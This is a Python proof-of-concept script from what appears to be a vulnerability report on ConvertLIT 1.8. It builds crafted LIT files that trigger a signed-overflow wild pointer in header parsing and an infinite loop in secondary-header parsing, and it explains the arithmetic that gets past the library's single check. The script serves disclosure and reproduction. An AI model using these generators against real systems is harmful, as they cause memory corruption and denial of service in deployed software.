#!/usr/bin/env python3
"""
Proof-of-concept generators for two ConvertLIT 1.8 defects.

1. build()          - the signed-overflow wild pointer in lit_i_read_headers().
                      NOT CLAIMED in this report: it is the same defect as
                      CVE-2026-107730. Kept here because NOT-CLAIMED.md documents
                      how that conclusion was reached, and reproducing it requires
                      these generators.

2. build_infloop()  - A-01, the infinite loop in lit_i_read_secondary_header().

--- The lit_i_read_headers() arithmetic (lib/litheaders.c) ---

  198:  int     i, total_hdr_size;
  199:  int     sec_hdr_len, hdr_len, num_pieces;
  ...
  226:  hdr_len     = READ_INT32(header+PRI_HDRLEN);     /* 0 .. 0x7FFFFFFF */
  227:  num_pieces  = READ_INT32(header+PRI_NUMPIECES);  /* 0 .. 0x7FFFFFFF */
  228:  sec_hdr_len = READ_INT32(header+PRI_SECHDRLEN);  /* 0 .. 0x7FFFFFFF */
  ...
  241:  total_hdr_size = hdr_len + num_pieces*PIECE_SIZE + sec_hdr_len;
  242:  if ((size_t)total_hdr_size >= litfile->filesize) {    <-- the only check
  243:      return E_LIT_FORMAT_ERROR;
  244:  }
  247:  header = litfile->readat(litfile->file_pointer, 0, total_hdr_size);
  249:  r = lit_i_read_secondary_header(litfile,
  250:      header+hdr_len+num_pieces*PIECE_SIZE, sec_hdr_len);
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ a different expression

The value that is checked is total_hdr_size; the value added to the pointer is the
sub-expression hdr_len + num_pieces*PIECE_SIZE. Driving only the sub-expression
negative and using sec_hdr_len to bring the total back to a small positive number
passes the single check.

  D     = hdr_len + num_pieces*16          (int32 arithmetic, pointer displacement)
  total = D + sec_hdr_len                  (int32 arithmetic, what gets checked)

Field constraint: READ_INT32 masks with 0x7FFFFFFF, so all three fields are in
[0, 0x7FFFFFFF].

File layout (PRI_SIZE = 40):
  0x00  "ITOLITLS"            magic             (checked at litheaders.c:219)
  0x08  u32 version = 1       PRI_VERSION       (checked at litheaders.c:229)
  0x0C  u32 hdr_len           PRI_HDRLEN
  0x10  u32 num_pieces        PRI_NUMPIECES
  0x14  u32 sec_hdr_len       PRI_SECHDRLEN
  0x18  16-byte GUID          PRI_GUID          (memcpy only, unchecked)
  0x28  padding                                 (so filesize > total_hdr_size)
"""
import struct, sys

MASK   = 0x7FFFFFFF
PIECE  = 16
HDRLEN = 40          # fixed, matching the original PoC

def i32(x):
    x &= 0xFFFFFFFF
    return x - 0x100000000 if x >= 0x80000000 else x

def build(displacement, total=39, filesize=64, hdr_len=HDRLEN):
    """
    Build a file whose hdr pointer is displaced by `displacement` bytes.
    Returns (bytes, field dict), or raises if a constraint cannot be met.
    """
    if (displacement - hdr_len) % PIECE != 0:
        raise ValueError(f"displacement {displacement} must satisfy (D - hdr_len) % 16 == 0 "
                         f"(with hdr_len={hdr_len}, D must be ≡ {hdr_len % PIECE} mod 16)")
    num_pieces = ((displacement - hdr_len) & 0xFFFFFFFF) // PIECE
    if not (0 <= num_pieces <= MASK):
        raise ValueError(f"num_pieces={num_pieces} is outside [0, 0x7FFFFFFF]")
    sec_hdr_len = (total - displacement) & 0xFFFFFFFF
    if not (0 <= sec_hdr_len <= MASK):
        raise ValueError(f"sec_hdr_len={sec_hdr_len} is outside [0, 0x7FFFFFFF]")

    # reproduce exactly what the library will compute, and assert on it
    chk_D     = i32(hdr_len + i32(num_pieces * PIECE))
    chk_total = i32(chk_D + sec_hdr_len)
    assert chk_D == displacement,  f"displacement mismatch: {chk_D} != {displacement}"
    assert chk_total == total,     f"total mismatch: {chk_total} != {total}"
    assert 0 <= chk_total < filesize, f"total={chk_total} outside [0, {filesize}) - the check would catch it"

    b  = b"ITOLITLS"
    b += struct.pack("<I", 1)             # version
    b += struct.pack("<I", hdr_len)
    b += struct.pack("<I", num_pieces)
    b += struct.pack("<I", sec_hdr_len)
    b += b"\x00" * 16                     # GUID
    b += b"\x00" * (filesize - len(b))
    assert len(b) == filesize
    return b, dict(hdr_len=hdr_len, num_pieces=num_pieces, sec_hdr_len=sec_hdr_len,
                   displacement=displacement, total_hdr_size=total, filesize=filesize)

if __name__ == "__main__":
    if len(sys.argv) >= 3:
        d = int(sys.argv[1], 0)
        data, f = build(d)
        open(sys.argv[2], "wb").write(data)
        print(f"{sys.argv[2]}: displacement={f['displacement']} num_pieces=0x{f['num_pieces']:08x} "
              f"sec_hdr_len=0x{f['sec_hdr_len']:08x} total={f['total_hdr_size']} size={f['filesize']}")
    else:
        print(__doc__)


# ---------------------------------------------------------------------------
# A-01 - infinite loop in lit_i_read_secondary_header() (CWE-835)
#
#  629:  offset = READ_INT32(hdr+LIT_BLOCK_LEN - 4);   /* = hdr+4 */
#  631:  while (offset < len) {
#  632:      blocktype = READ_U32(hdr+offset+LIT_BLOCK_TAG);   /* +0 */
#  633:      blockver  = READ_U32(hdr+offset+LIT_BLOCK_VER);   /* +4 */
#  634:      blocklen  = READ_INT32(hdr+offset+LIT_BLOCK_LEN); /* +8 */
#  635:      if (blocklen < 0) break;   /* dead: READ_INT32 masks the sign bit */
#         switch (blocktype) { case CAOL_TAG: ... case ITSF_TAG: ... }
#                                      /* no default: unknown tags fall through */
#  672:      offset += blocklen;        /* blocklen == 0 means no progress */
#        }
#
# The trigger is just blocklen == 0 with a blocktype that is neither CAOL nor
# ITSF. Since the switch has no default case, all 2^32-2 remaining tag values
# work.
# ---------------------------------------------------------------------------

CAOL_TAG = 0x4c4f4143
ITSF_TAG = 0x46535449

def build_infloop(sec_hdr_len=12, init_offset=0, blocktype=0xAABBCCDD,
                  hdr_len=40, num_pieces=5, pad=1):
    """
    num_pieces defaults to 5, which is inside the 5..16 gate that the official
    CVE-2026-107730 fix adds. That shows this defect survives that fix.
    """
    if blocktype in (CAOL_TAG, ITSF_TAG):
        raise ValueError("a blocktype matching a switch case does not trigger this")
    if not (5 <= num_pieces <= 16):
        raise ValueError("num_pieces must pass the official fix gate (5..16)")
    if sec_hdr_len < init_offset + 12:
        raise ValueError("reading 12 bytes at offset needs sec_hdr_len >= init_offset+12")

    S = sec_hdr_len
    total = hdr_len + num_pieces * PIECE + S
    fsz = total + pad                    # guarantees total_hdr_size < filesize
    b = bytearray(fsz)
    b[0:8] = b"ITOLITLS"
    struct.pack_into("<I", b,  8, 1)             # version
    struct.pack_into("<I", b, 12, hdr_len)
    struct.pack_into("<I", b, 16, num_pieces)
    struct.pack_into("<I", b, 20, S)             # sec_hdr_len = len
    off = hdr_len + num_pieces * PIECE           # start of the secondary header
    struct.pack_into("<I", b, off + 4, init_offset)        # initial offset
    o = off + init_offset
    struct.pack_into("<I", b, o + 0, blocktype)            # unknown tag
    struct.pack_into("<I", b, o + 8, 0)                    # blocklen = 0
    return bytes(b), dict(hdr_len=hdr_len, num_pieces=num_pieces, sec_hdr_len=S,
                          init_offset=init_offset, blocktype=blocktype,
                          total_hdr_size=total, filesize=fsz)
